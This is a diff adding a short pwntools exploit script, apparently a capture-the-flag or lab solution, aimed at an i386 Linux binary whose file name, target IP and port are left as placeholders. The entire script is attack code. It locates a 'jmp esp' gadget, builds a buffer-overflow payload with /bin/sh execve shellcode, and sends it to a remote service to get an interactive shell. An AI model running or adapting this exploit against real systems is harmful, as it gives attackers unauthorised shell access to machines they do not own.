@@ -1,0 +1,24 @@
+from pwn import *
+
+context.update(arch="i386", os="linux")
+
+binary = ELF("./file name to put here")
+
+# search for instruction "jmp esp" location
+jmp_esp_asm = asm("jmp esp")
+jmp_esp = next(binary.search(jmp_esp_asm))
+
+# go back to vuln()'s buffer
+call_eax_asm = asm("call eax")	# 2 bytes
+
+# change the stack pointer so when shellcode push things on stack, won't overwrite our shellcode
+sub_esp_0x20_asm = asm("sub esp, 0x20")	 # 3 bytes
+
+# craft our exploit
+exploit = b"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80" + p32(jmp_esp, endian="little") + b"\x31\xd2\x31\xc9" + sub_esp_0x20_asm + call_eax_asm
+
+r = remote("target IP", PORT)
+
+r.sendlineafter(">", exploit)
+
+r.interactive()
